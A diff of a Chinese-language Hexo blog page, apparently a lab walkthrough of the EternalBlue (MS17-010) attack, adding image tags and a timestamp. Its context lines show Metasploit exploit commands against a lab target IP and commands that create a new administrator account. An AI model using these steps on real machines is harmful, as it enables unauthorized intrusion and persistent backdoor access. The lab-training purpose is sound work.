@@ -99,11 +99,13 @@
 <meta property="og:image" content="g:/hexo/source/_posts/New-Page-1/nmap2.jpg">
 <meta property="og:image" content="http://yoursite.com/2019/03/23/New-Page-1/mete.png">
 <meta property="og:image" content="g:/hexo/source/_posts/New-Page-1/mete.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/23/New-Page-1/mete1.jpg">
 <meta property="og:image" content="g:/hexo/source/_posts/New-Page-1/mete1.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/23/New-Page-1/mete3.jpg">
 <meta property="og:image" content="g:/hexo/source/_posts/New-Page-1/mete3.jpg">
 <meta property="og:image" content="http://yoursite.com/2019/03/23/New-Page-1/rdesktop.jpg">
 <meta property="og:image" content="g:/hexo/source/_posts/New-Page-1/rdesktop.jpg">
-<meta property="og:updated_time" content="2019-03-24T08:02:04.981Z">
+<meta property="og:updated_time" content="2019-04-01T12:15:04.438Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="永恒之蓝攻击靶场">
 <meta name="twitter:description" content="永恒之蓝介绍​      1.恶意代码会扫描开放445和139文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。 ​       2.漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。具体举例来说，比如在Intel Pentium芯片中">
@@ -359,12 +361,12 @@
 <img src="/2019/03/23/New-Page-1/mete.png">
 <p><img src="G:\hexo\source\_posts\New-Page-1\mete.png" alt></p>
 <p>输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>执行漏洞<br>输入<code>show options</code>查看当前攻击配置</p>
-
+<img src="/2019/03/23/New-Page-1/mete1.jpg">
 <p><img src="G:\hexo\source\_posts\New-Page-1\mete1.jpg" alt></p>
 <p>将配置中第一行的<code>RHOST</code>修改为靶机IP地址</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.28.128</span><br></pre></td></tr></table></figure>
 <p>修改完查看配置，配置完成后，使用 <code>run</code> 命令直接执行。</p>
-
+<img src="/2019/03/23/New-Page-1/mete3.jpg">
 <p><img src="G:\hexo\source\_posts\New-Page-1\mete3.jpg" alt></p>
 <p>在命令中直接可以输入<code>whoami</code>当前登录的用户</p>
 <h3 id="3-4-在靶机创建用户并赋予管理员权限"><a href="#3-4-在靶机创建用户并赋予管理员权限" class="headerlink" title="3.4 在靶机创建用户并赋予管理员权限"></a>3.4 在靶机创建用户并赋予管理员权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user username password /add</span><br><span class="line">net localgroup administrators username /add</span><br></pre></td></tr></table></figure>
